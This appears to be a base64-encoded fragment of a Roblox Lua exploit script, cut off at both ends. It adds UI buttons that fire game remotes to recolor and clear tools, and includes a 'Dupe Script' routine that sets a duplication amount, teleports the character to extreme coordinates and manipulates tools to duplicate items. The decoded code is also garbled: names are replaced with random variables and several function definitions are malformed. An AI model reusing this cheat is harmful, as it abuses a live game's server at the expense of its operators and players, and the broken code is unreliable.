uKCkpIGRvCiAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCB2YXJfcDZubG5vID0gbWF0aC5taW4oaSwgI0dyaXBQb3NUYWJsZSkKICAgICAgICAgICAgbG9jYWwgdmFyX3d2bW96cCA9IEdyaXBQb3NUYWJsZVtncmlwUG9zSW5kZXhdCiAgICAgICAgICAgIGlmIHRvb2w6SXNEZXNjZW5kYW50T2YoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcikgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB3YXJuKCJUb29sIiwgdG9vbC5OYW1lLCAiaXMgbm90IGluIGNoYXJhY3RlciIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHdhaXQoMSkKICAgIAogICAgZnVuY3Rpb24gRXF1aXBFdmVyeXRoaW5nKCkKICAgICAgICAKICAgICAgICBsb2NhbCB2YXJfM2x6c2R3ID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgICAgICAKICAgICAgICAKICAgICAgICBsb2NhbCB2YXJfb3V5aWV6IGNoYW5nZUFuaW1hdGlvbih0b29sKSAgCiAgICAgICAgICAgIGlmIHRvb2w6RmluZEZpcnN0Q2hpbGQoIkN5Y2xlTmV4dEFuaW1hdGlvbiIpIHRoZW4gIAogICAgICAgICAgICAgICAgdG9vbC5DeWNsZU5leHRBbmltYXRpb246RmlyZVNlcnZlcigpICAKICAgICAgICAgICAgZW5kICAKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAKICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMocGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvICAKICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09ICJQYWludFJvbGxlciIgdGhlbiAgCiAgICAgICAgICAgICAgICBjaGFuZ2VBbmltYXRpb24odG9vbCkgIAogICAgICAgICAgICBlbmQgIAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIAogICAgICAgIGxvY2FsIHZhcl8yeHpkdHggPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkgIAogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhjaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8gIAogICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gIlBhaW50Um9sbGVyIiB0aGVuICAKICAgICAgICAgICAgICAgIGNoYW5nZUFuaW1hdGlvbih0b29sKSAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgICAgZW5kCiAgICAgICAgCiAgICBlbmQKICAgIAogICAgRXF1aXBFdmVyeXRoaW5nKCkKICAgIHdhaXQoMSkKICAgIEVxdWlwRXZlcnl0aGluZygpCiAgICB3YWl0KDEpCiAgICBFcXVpcEV2ZXJ5dGhpbmcoKQogICAgCiAgICBmdW5jdGlvbiBzdGFydFNwaW4oKQogICAgICAgIGxvY2FsIHZhcl8ybmc0OTcgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgICAgIGxvY2FsIHZhcl8wdTdvaWsgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQogICAgICAgIGxvY2FsIHZhcl84cGJhM2EgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgdmFyX2Y2NjFrMCA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIHZhcl94b3B4cGcgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAKICAgICAgICB0YXNrLndhaXQoMSkgIAogICAgICAgIAogICAgICAgIGxvY2FsIHZhcl9rdjZjdGEgPSBtYXRoLnJhZCgxNzUwKSAKICAKICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbihkdCkgIAogICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSByb290UGFydC5DRnJhbWUgKiBDRnJhbWUuQW5nbGVzKDAsIHNwaW5TcGVlZCAqIGR0LCAwKSAgCiAgICAgICAgZW5kKQogICAgCiAgICAKICAgIGVuZAogICAgCiAgICBzdGFydFNwaW4oKSBlbmQKZW5kCn0pCi0tIFZhcmlhYmxlIHRvIHN0b3JlIHRoZSBzZWxlY3RlZCBjb2xvcgpsb2NhbCB2YXJfMWduMjFsID0gY29sb3JzVGFibGVbMV0uQ29sb3IKCi0tIEZ1bmN0aW9uIHRvIGFwcGx5IHRoZSBzZWxlY3RlZCBjb2xvcgpsb2NhbCB2YXJfYTFicHJ0IGFwcGx5U2VsZWN0ZWRDb2xvcigpCiAgICBsb2NhbCB2YXJfZ3pkMXpuID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIHZhcl9mc2J1MjEgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgbG9jYWwgdmFyX3A4cXZpcCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgbG9jYWwgdmFyXzB5ajU1aSA9IHtzZWxlY3RlZENvbG9yfQoKICAgIGxvY2FsIHZhcl9idXdpancgY2hhbmdlVG9vbENvbG9yKHRvb2wpCiAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09ICJQYWludFJvbGxlciIgdGhlbgogICAgICAgICAgICBsb2NhbCB2YXJfem16ZGl1ID0gdG9vbDpGaW5kRmlyc3RDaGlsZCgiU2V0Q29sb3IiLCB0cnVlKQogICAgICAgICAgICBpZiBTZXRDb2xvciB0aGVuCiAgICAgICAgICAgICAgICBTZXRDb2xvcjpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoYmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBjaGFuZ2VUb29sQ29sb3IodG9vbCkKICAgIGVuZAogICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGNoYW5nZVRvb2xDb2xvcih0b29sKQogICAgZW5kCmVuZAoKLS0gRnVuY3Rpb24gdG8gZXF1aXAgYW5kIHVuZXF1aXAgdG9vbHMKbG9jYWwgdmFyX2syZTdpMyBlcXVpcEFuZFVuZXF1aXBUb29scyhjYWxsYmFjaykKICAgIGxvY2FsIHZhcl9nMml3OXYgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgbG9jYWwgdmFyX3RtY3JsbiA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICBsb2NhbCB2YXJfdDZnczR3ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCgogICAgbG9jYWwgdmFyX2p1eXRxdCB1bmVxdWlwVG9vbHMoKQogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhjaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09ICJQYWludFJvbGxlciIgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBiYWNrcGFjawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIGxvY2FsIHZhcl8zM2JsaGIgZXF1aXBUb29scygpCiAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSAiUGFpbnRSb2xsZXIiIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgdW5lcXVpcFRvb2xzKCkKICAgIHdhaXQoMC43KQogICAgaWYgY2FsbGJhY2sgdGhlbiBjYWxsYmFjaygpIGVuZAogICAgd2FpdCgwLjcpCiAgICBlcXVpcFRvb2xzKCkKZW5kCgotLSBEcm9wZG93biB0byBzZWxlY3QgdGhlIGNvbG9yClRvb2xzVGFiOkFkZERyb3Bkb3duKHsKICAgIE5hbWUgPSAiU2VsZWN0IENvbG9yIiwKICAgIERlc2NyaXB0aW9uID0gIkNob29zZSBhIGNvbG9yIHRvIGFwcGx5IiwKICAgIE9wdGlvbnMgPSAoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHZhcl9zODBzbHMgPSB7fQogICAgICAgIGZvciBfLCBjb2xvciBpbiBpcGFpcnMoY29sb3JzVGFibGUpIGRvCiAgICAgICAgICAgIHRhYmxlLmluc2VydChjb2xvck5hbWVzLCBjb2xvci5OYW1lKQogICAgICAgIGVuZAogICAgICAgIHJldHVybiBjb2xvck5hbWVzCiAgICBlbmQpKCksCiAgICBEZWZhdWx0ID0gY29sb3JzVGFibGVbMV0uTmFtZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc2VsZWN0ZWQpCiAgICAgICAgZm9yIF8sIGNvbG9yIGluIGlwYWlycyhjb2xvcnNUYWJsZSkgZG8KICAgICAgICAgICAgaWYgY29sb3IuTmFtZSA9PSBzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICBzZWxlY3RlZENvbG9yID0gY29sb3IuQ29sb3IKICAgICAgICAgICAgICAgIGVxdWlwQW5kVW5lcXVpcFRvb2xzKGFwcGx5U2VsZWN0ZWRDb2xvcikKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBGdW5jdGlvbiB0byBhcHBseSBSR0IgY3ljbGUKbG9jYWwgdmFyX3k1azJoOSBhcHBseVJHQkN5Y2xlKCkKICAgIGxvY2FsIHZhcl9mb3dybnEgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgbG9jYWwgdmFyX2tjcGwyeCA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICBsb2NhbCB2YXJfcXM1NWZ0ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBsb2NhbCB2YXJfcGNsY3B3ID0gMAogICAgbG9jYWwgdmFyX3ZyZjRpdCA9ICNjb2xvcnNUYWJsZQoKICAgIGxvY2FsIHZhcl9odHFpb28gY2hhbmdlVG9vbENvbG9yKHRvb2wsIGNvbG9yKQogICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSAiUGFpbnRSb2xsZXIiIHRoZW4KICAgICAgICAgICAgbG9jYWwgdmFyX2hpejBueCA9IHRvb2w6RmluZEZpcnN0Q2hpbGQoIlNldENvbG9yIiwgdHJ1ZSkKICAgICAgICAgICAgaWYgU2V0Q29sb3IgdGhlbgogICAgICAgICAgICAgICAgU2V0Q29sb3I6RmlyZVNlcnZlcihjb2xvcikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoYmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sLk5hbWUgPT0gIlBhaW50Um9sbGVyIiB0aGVuCiAgICAgICAgICAgIHRvb2xJbmRleCA9IHRvb2xJbmRleCArIDEKICAgICAgICAgICAgbG9jYWwgdmFyXzZuMGd6OCA9IGNvbG9yc1RhYmxlWyh0b29sSW5kZXggLSAxKSAlIHRvdGFsQ29sb3JzICsgMV0uQ29sb3IKICAgICAgICAgICAgY2hhbmdlVG9vbENvbG9yKHRvb2wsIGNvbG9yKQogICAgICAgIGVuZAogICAgZW5kCiAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoY2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbC5OYW1lID09ICJQYWludFJvbGxlciIgdGhlbgogICAgICAgICAgICB0b29sSW5kZXggPSB0b29sSW5kZXggKyAxCiAgICAgICAgICAgIGxvY2FsIHZhcl83NDBybG8gPSBjb2xvcnNUYWJsZVsodG9vbEluZGV4IC0gMSkgJSB0b3RhbENvbG9ycyArIDFdLkNvbG9yCiAgICAgICAgICAgIGNoYW5nZVRvb2xDb2xvcih0b29sLCBjb2xvcikKICAgICAgICBlbmQKICAgIGVuZAplbmQKCi0tIEJ1dHRvbiB0byBhcHBseSBjb2xvciBjeWNsZQpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJSYWluYm93IiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGVxdWlwQW5kVW5lcXVpcFRvb2xzKGFwcGx5UkdCQ3ljbGUpCiAgICBlbmQKfSkKCi0tIENvbG9yIGNvbWJpbmF0aW9ucwpsb2NhbCB2YXJfYmpoNWg5ID0ge30KZm9yIGksIGNvbG9yMSBpbiBpcGFpcnMoY29sb3JzVGFibGUpIGRvCiAgICBmb3IgaiwgY29sb3IyIGluIGlwYWlycyhjb2xvcnNUYWJsZSkgZG8KICAgICAgICBpZiBpIH49IGogdGhlbgogICAgICAgICAgICB0YWJsZS5pbnNlcnQoY29sb3JDb21iaW5hdGlvbnMsIHtOYW1lID0gY29sb3IxLk5hbWUgLi4gIiBhbmQgIiAuLiBjb2xvcjIuTmFtZSwgQ29sb3JzID0ge2NvbG9yMS5Db2xvciwgY29sb3IyLkNvbG9yfX0pCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgotLSBEcm9wZG93biBmb3IgY29sb3IgY29tYmluYXRpb25zClRvb2xzVGFiOkFkZERyb3Bkb3duKHsKICAgIE5hbWUgPSAiU2VsZWN0IENvbG9yIENvbWJpbmF0aW9uIiwKICAgIERlc2NyaXB0aW9uID0gIkNob29zZSBhIGNvbG9yIGNvbWJpbmF0aW9uIiwKICAgIE9wdGlvbnMgPSAoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHZhcl92amQyY3MgPSB7fQogICAgICAgIGZvciBfLCBjb21iaW5hdGlvbiBpbiBpcGFpcnMoY29sb3JDb21iaW5hdGlvbnMpIGRvCiAgICAgICAgICAgIHRhYmxlLmluc2VydChjb21iaW5hdGlvbk5hbWVzLCBjb21iaW5hdGlvbi5OYW1lKQogICAgICAgIGVuZAogICAgICAgIHJldHVybiBjb21iaW5hdGlvbk5hbWVzCiAgICBlbmQpKCksCiAgICBEZWZhdWx0ID0gY29sb3JDb21iaW5hdGlvbnNbMV0uTmFtZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc2VsZWN0ZWQpCiAgICAgICAgZm9yIF8sIGNvbWJpbmF0aW9uIGluIGlwYWlycyhjb2xvckNvbWJpbmF0aW9ucykgZG8KICAgICAgICAgICAgaWYgY29tYmluYXRpb24uTmFtZSA9PSBzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfdHlzbHp0IGFwcGx5RG91YmxlQ29sb3IoKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl95OHQ1eWogPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl95MHhhc2YgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl92YTVvM2kgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfdndiMXM4ID0gMAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl84NGs2NXogPSBjb21iaW5hdGlvbi5Db2xvcnMKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX2t0bjBiYiBjaGFuZ2VUb29sQ29sb3IodG9vbCwgY29sb3IpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSAiUGFpbnRSb2xsZXIiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9ydHFpZ20gPSB0b29sOkZpbmRGaXJzdENoaWxkKCJTZXRDb2xvciIsIHRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBTZXRDb2xvciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2V0Q29sb3I6RmlyZVNlcnZlcihjb2xvcikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2wuTmFtZSA9PSAiUGFpbnRSb2xsZXIiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xJbmRleCA9IHRvb2xJbmRleCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl83MDBrOHogPSBjb2xvcnNbKHRvb2xJbmRleCAtIDEpICUgMiArIDFdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFuZ2VUb29sQ29sb3IodG9vbCwgY29sb3IpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhjaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbC5OYW1lID09ICJQYWludFJvbGxlciIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbEluZGV4ID0gdG9vbEluZGV4ICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFyX2Zrc2hieiA9IGNvbG9yc1sodG9vbEluZGV4IC0gMSkgJSAyICsgMV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoYW5nZVRvb2xDb2xvcih0b29sLCBjb2xvcikKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVxdWlwQW5kVW5lcXVpcFRvb2xzKGFwcGx5RG91YmxlQ29sb3IpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gUmVmZXJlbmNlcyB0byByZW1vdGVzCmxvY2FsIHZhcl9ianRjbjEgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFDbGVhMXJUb29sMXMiKQpsb2NhbCB2YXJfM2dqeDhrID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKQoKLS0gSXRlbSBjb250cm9sIHNlY3Rpb24KbG9jYWwgdmFyXzlxc2dtbiA9IFRvb2xzVGFiOkFkZFNlY3Rpb24oewogICAgTmFtZSA9ICJJdGVtcyBDb250cm9sIgp9KQoKLS0gQnV0dG9uIHRvIGNsZWFyIGFsbCB0b29scwpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJDbGVhciBBbGwgVG9vbHMiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgdmFyX2ZwZTRhNSA9IHsKICAgICAgICAgICAgWzFdID0gIkNsZWFyQWxsVG9vbHMiCiAgICAgICAgfQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxQ2xlYTFyVG9vbDFzIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICBlbmQKfSkKCi0tIFNlY3Rpb24gdG8gZXF1aXAgaXRlbXMKU2VjdGlvbiA9IFRvb2xzVGFiOkFkZFNlY3Rpb24oewogICAgTmFtZSA9ICJFcXVpcCBJdGVtcyIKfSkKCi0tIEJ1dHRvbiB0byBlcXVpcCBhbGwgaXRlbXMKVG9vbHNUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiRXF1aXAgYWxsIGl0ZW1zIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGZvciBfLCB0b29sIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBTZWN0aW9uIGZvciBDcm9zcyBHcmlwClNlY3Rpb24gPSBUb29sc1RhYjpBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSAiQ3Jvc3MgR3JpcCIKfSkKCi0tIEJ1dHRvbiBmb3IgR2lhbnQgSm91c3QgQmx1ZSBDcm9zcwpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJHaWFudCBKb3VzdCBCbHVlIENyb3NzIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgdG9vbHNlbGN0ZWQgPSAiSm91c3RCbHVlIgogICAgICAgIGR1cGVhbW90ID0gMTc1IC0tUHV0IGFtb3V0aCB0byBkdXBlCiAgICAgICAgcGlja3Rvb2xyZW1vdGUgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFUb28xbCIpCiAgICAgICAgY2xlYXJ0b29scmVtb3RlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxQ2xlYTFyVG9vbDFzIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkdXBpbmcgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2xkY2YgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCmdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLHtUaXRsZT0iRHVwZSBTY3JpcHQiLFRleHQ9IlBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuIiwgQnV0dG9uMSA9ICJJIHVuZGVyc3RhbmQiICxEdXJhdGlvbj01fSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIG09MSwyIGRvIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDk5OTk5OTk5OS40MTQsIC00OTAsIDk5OTk5OTk5OS40MTQsIDAuOTc0MzYwNDA2LCAtMC4xNzU3MzQwODgsIDAuMTQwNDk3NjEsIC0wLjEzMzQ0MTQwNCwgMC4wNTE0MDUzMDY5LCAwLjk4OTcyMjcyOSwgLTAuMTgxMTUwMzAyLCAtMC45ODMwOTQ2OTIsIDAuMDI2NjM3MDkyMikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYWlkaixhZmggaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBhZmguTmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFmaDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWZoLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBhaWVmaGlld2h3ZixkdmpidmogaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR2amJ2ajpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR2amJ2ai5OYW1lID09IHRvb2xzZWxjdGVkID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkdmpidmo6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHR0anRqdXRqdXRqanRqLGRkdmR2ZHN2ZGZicm55dHl0bXZkdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRkdmR2ZHN2ZGZicm55dHl0bXZkdjpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgI